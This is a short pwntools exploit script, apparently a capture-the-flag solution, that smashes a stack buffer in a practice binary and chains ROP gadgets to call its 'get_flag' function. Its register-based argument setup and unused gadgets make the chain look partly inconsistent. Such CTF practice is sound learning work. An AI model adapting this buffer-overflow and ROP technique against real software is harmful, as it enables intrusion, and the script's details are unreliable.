from pwn import *
# Set up the binary and context
binary = './pwn/stack/rop-9/rop9'
elf = ELF(binary)
context.binary = binary
context.terminal = ['tmux', 'splitw', '-h']

# Start the process or connect to the remote service
p = process(binary)
# If remote, use: p = remote('host', port)

# Gadgets and addresses
pop_eax = 0x080b91e6  # pop eax ; ret
pop_ebx = 0x080481ad  # pop ebx ; ret
pop_ecx_ebx = 0x0806fc31  # pop ecx ; pop ebx ; ret
pop_edx = 0x0806fc0a  # pop edx ; ret
int_80 = 0x08049563  # int 0x80
get_flag = elf.symbols['get_flag']

# Arguments for get_flag
a1 = 814536271
a2 = 425138641

# Offset to return address
offset = 56

# Craft the payload
payload = b'A' * offset
payload += p32(pop_eax)
payload += p32(a1)
payload += p32(pop_ebx)
payload += p32(a2)
payload += p32(get_flag)

# Send the payload
p.sendline(payload)

# Interact with the process to get the flag
p.interactive()
